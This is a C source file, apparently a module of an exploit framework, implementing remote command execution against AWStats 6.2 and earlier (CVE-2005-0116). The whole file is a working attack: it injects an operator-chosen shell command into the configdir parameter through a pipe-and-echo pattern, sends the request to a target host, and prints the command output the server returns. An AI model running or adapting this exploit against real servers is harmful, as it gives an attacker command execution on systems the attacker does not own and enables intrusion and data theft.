#include <stdio.h>
#include <stdlib.h>
#include "../exploits.h"
#include "../http-client.h"

struct details execAwstatsDetails = {
    REMOTE
};

struct exploitParam execAwstatsOpts[MAX_NUM_OF_PARAMS] = {
    { "RHOST", REQUIRED, STRING, NOT_SET, NULL, NOT_SET },
    { "RPORT", REQUIRED, STRING, NOT_SET, "80", 2 },
    { "URI", REQUIRED, STRING, NOT_SET, "/awstats/awstats.pl", 19 },
    { "VHOST", NOT_REQUIRED, STRING, NOT_SET, NULL, NOT_SET }
};

static int check(struct Xploit *xp)
{
    // TODO: check if target is exploitable
    return 0;
}

void execAwstatsHelp()
{
    printf("%s[ CVE-2005-0116 ]%s AWStats configdir remote command execution\n", txtblu, txtrst);
    printf("Affected software: Awstats ver. <= 6.2\n");
    printf("References:\n");
    printf("https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2005-0116\n");
    printf("http://www.securityfocus.com/bid/12298/info\n");
}

int execAwstatsFunc(struct Xploit *xp, unsigned char *rawPayload, unsigned int rawPayloadLen)
{
    char path[1024] = {0};
    char host[1024];
    char *rhost = xp->currentExploit->params[0].strValue;
    char *rport = xp->currentExploit->params[1].strValue;
    char *uri = xp->currentExploit->params[2].strValue;
    HTTP_RESPONSE_CODE httpCode;
    char *resp = NULL;
    char *payload = NULL;

    // exploit pattern
    char * pattern = "%s?configdir=|echo;echo%20ZZZ;%s;echo%20ZZZ;echo|";

    if(debugMode())
        debugMsg("payload: %s", rawPayload);

    // url encode payload
    httpUriEncode(rawPayload, &payload);

    // prepare final uri
    sprintf(path, pattern, uri, payload);
    if(debugMode())
        debugMsg("final uri: %s", path);

    // do GET request
    httpCode = httpGETRequest(rhost, atoi(rport), path, &resp, NULL);

    // handle response
    if(httpCode == HTTP200) 
        printMsg(LOG_INFO, "server returned SUCCESS");
    else 
        printMsg(LOG_WARN, "server may not be vulnerable");

    if(debugMode())
        debugMsg("Command output from the server:\n %s", resp);

    // cleanup
    free(resp);
    free(payload);
    return 0;
}

struct exploit execAwstats = {
    3,
    "exec-awstats",
    execAwstatsFunc,
    execAwstatsOpts,
    4,
    execAwstatsHelp, 
    &execAwstatsDetails
};
